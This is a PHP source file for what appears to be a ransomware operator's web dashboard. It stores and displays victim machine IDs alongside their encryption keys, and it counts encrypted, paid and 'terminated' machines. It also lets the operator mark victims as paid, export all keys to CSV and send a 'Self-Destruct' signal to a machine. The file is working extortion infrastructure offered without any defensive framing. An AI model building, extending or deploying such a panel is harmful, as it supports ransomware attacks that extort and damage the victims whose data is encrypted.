<?php
session_start();

// Step 1: Redirect if not logged in
if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("location: login.php");
    exit;
}

// Step 2: Include the database connection file
require_once '../includes/db.php'; // Adjust the path as necessary

// Step 3: Handle CSV Export
if (isset($_GET['action']) && $_GET['action'] == 'export') {
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="machine_keys.csv"');
    $output = fopen("php://output", "w");
    fputcsv($output, array('S.N', 'Machine ID', 'Encryption Key', 'Received Date', 'Status'));
    $stmt = $pdo->query("SELECT machine_id, encryption_key, received_date, status FROM machine_keys ORDER BY received_date DESC");
    $sn = 1;
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        fputcsv($output, array($sn++, $row['machine_id'], $row['encryption_key'], $row['received_date'], $row['status']));
    }
    fclose($output);
    exit();
}

// Step 4: Handle Mark as Paid
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['markPaid'])) {
    $machineId = $_POST['machineId'];
    $updateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'paid' WHERE key_id = ?");
    if ($updateStmt->execute([$machineId])) {
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh the page
        exit;
    }
}

// Step 5: Handle termination signal update
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['terminate'])) {
    $machineId = $_POST['machineId'];
    $terminateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'terminated' WHERE id = ? AND stop_signal = 1");
    if ($terminateStmt->execute([$machineId])) {
        header("Location: " . $_SERVER['PHP_SELF']); // Refresh the page
        exit;
    }
}

// Step 6: Fetch data for dashboard metrics
$totalEncryptedStmt = $pdo->query("SELECT COUNT(DISTINCT machine_id) AS total_encrypted FROM machine_keys");
$totalEncrypted = $totalEncryptedStmt->fetch(PDO::FETCH_ASSOC)['total_encrypted'];

$machinePaidStmt = $pdo->query("SELECT COUNT(*) AS machine_paid FROM machine_keys WHERE status = 'paid'");
$machinePaid = $machinePaidStmt->fetch(PDO::FETCH_ASSOC)['machine_paid'];

$machineTerminatedStmt = $pdo->query("SELECT COUNT(*) AS machine_terminated FROM machine_keys WHERE stop_signal = 1");
$machineTerminated = $machineTerminatedStmt->fetch(PDO::FETCH_ASSOC)['machine_terminated'];

$activeWarriors = $totalEncrypted - $machinePaid;

// Step 7: Fetch current user information
$currentUserInfo = null;
if (isset($_SESSION["user_id"])) {
    $sql = "SELECT username, profile_pic FROM users WHERE user_id = :user_id";
    $stmt = $pdo->prepare($sql);
    $stmt->bindParam(":user_id", $_SESSION["user_id"], PDO::PARAM_INT);
    $stmt->execute();
    $currentUserInfo = $stmt->fetch(PDO::FETCH_ASSOC);
}

// Step 8: Fetch machine keys data for display
$stmt = $pdo->query("SELECT key_id, machine_id, encryption_key, received_date, status, stop_signal FROM machine_keys ORDER BY received_date DESC");
$keys = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Step 9: HTML Head Section -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Dashboard</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="stylesheet" href="../assets/css/dashboard.css">
    <style>
        .fa-red, .fas {
            color: red !important;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <!-- Step 10: Sidebar -->
        <nav id="sidebar">
            <div class="sidebar-header">
                <img src="<?= htmlspecialchars($currentUserInfo['profile_pic'] ?: '../assets/img/default-avatar.png') ?>" alt="User Avatar" class="img-fluid rounded-circle mb-2">
                <h4 class="text-center text-white"><?= htmlspecialchars($currentUserInfo["username"]); ?></h4>
            </div>
            <ul class="list-unstyled components">
                <li class="nav-item">
                    <a class="nav-link active text-white" href="#"><i class="fas fa-home" style="color:#0f0;"></i> Home</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link text-white" href="profile.php"><i class="fas fa-user" style="color:#0f0;"></i> Profile</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link text-white" href="logout.php"><i class="fas fa-sign-out-alt" style="color:#0f0;"></i> Logout</a>
                </li>
            </ul>
        </nav>

        <!-- Step 11: Page Content -->
        <div id="content">
            <div class="container-fluid">
                <!-- Step 12: Welcome Message -->
                <h1 class="text-white">Welcome back, <?= htmlspecialchars($_SESSION["username"]); ?>!</h1>
                
                <!-- Step 13: Status Overview section -->
                <div class="container-fluid pt-4 px-4">
                    <div class="row g-4">
                        <div class="col-sm-6 col-xl-3">
                            <div class="bg-light-black rounded d-flex align-items-center justify-content-between p-4">
                                <i class="fa fa-chart-line fa-3x fa-red"></i>
                                <div class="ms-3">
                                    <p class="mb-2 text-white">Active Warriors</p>
                                    <h6 class="mb-0 text-white"><?= $activeWarriors ?></h6>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-xl-3">
                            <div class="bg-light-black rounded d-flex align-items-center justify-content-between p-4">
                                <i class="fa fa-chart-bar fa-3x fa-red"></i>
                                <div class="ms-3">
                                    <p class="mb-2 text-white">Total Encrypted</p>
                                    <h6 class="mb-0 text-white"><?= $totalEncrypted ?></h6>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-xl-3">
                            <div class="bg-light-black rounded d-flex align-items-center justify-content-between p-4">
                                <i class="fa fa-chart-area fa-3x fa-red"></i>
                                <div class="ms-3">
                                    <p class="mb-2 text-white">Machine Paid</p>
                                    <h6 class="mb-0 text-white"><?= $machinePaid ?></h6>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-xl-3">
                            <div class="bg-light-black rounded d-flex align-items-center justify-content-between p-4">
                                <i class="fa fa-chart-pie fa-3x fa-red"></i>
                                <div class="ms-3">
                                    <p class="mb-2 text-white">Machine Terminated</p>
                                    <h6 class="mb-0 text-white"><?= $machineTerminated ?></h6>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Sale & Revenue End -->

                <!-- Step 14: Machine Keys Table -->
                <div class="container-fluid pt-4 px-4">
                    <div class="bg-light-black rounded p-4">
                        <a href="?action=export" class="btn btn-success mb-3">Export to CSV</a>
                        <div class="table-responsive">
                            <table class="table text-start align-middle table-bordered table-hover mb-0 text-white">
                                <thead>
                                    <tr>
                                        <th>S.N</th>
                                        <th>Machine ID</th>
                                        <th>Encryption Key</th>
                                        <th>Received Date</th>
                                        <th>Status</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($keys as $index => $key): ?>
                                    <tr>
                                        <td><?= $index + 1; ?></td>
                                        <td><?= htmlspecialchars($key['machine_id']); ?></td>
                                        <td><?= htmlspecialchars(substr($key['encryption_key'], 0, 50)) . '...'; ?></td>
                                        <td><?= htmlspecialchars($key['received_date']); ?></td>
                                        <td>
                                            <?php if ($key['status'] !== 'paid'): ?>
                                                <form method="POST" action="">
                                                    <input type="hidden" name="machineId" value="<?= $key['key_id']; ?>">
                                                    <button type="submit" name="markPaid" class="btn btn-success btn-sm">Mark as Paid</button>
                                                </form>
                                            <?php else: ?>
                                                Paid
                                            <?php endif; ?>
                                        </td>
                                        <td>                             
                                            <button class="btn btn-danger btn-sm" onclick="sendKillSignal('<?= $key['machine_id']; ?>')">Self-Destruct</button>                                           
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div> <!-- Container Fluid End -->
        </div> <!-- Page Content End -->
    </div> <!-- Wrapper End -->
    
    <!-- Step 15: Scripts for Bootstrap and Sidebar toggle -->
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js'></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js'></script>
    <script src='../assets/js/dashboard.js'></script> <!-- Link to the external JS file -->

</body>
</html>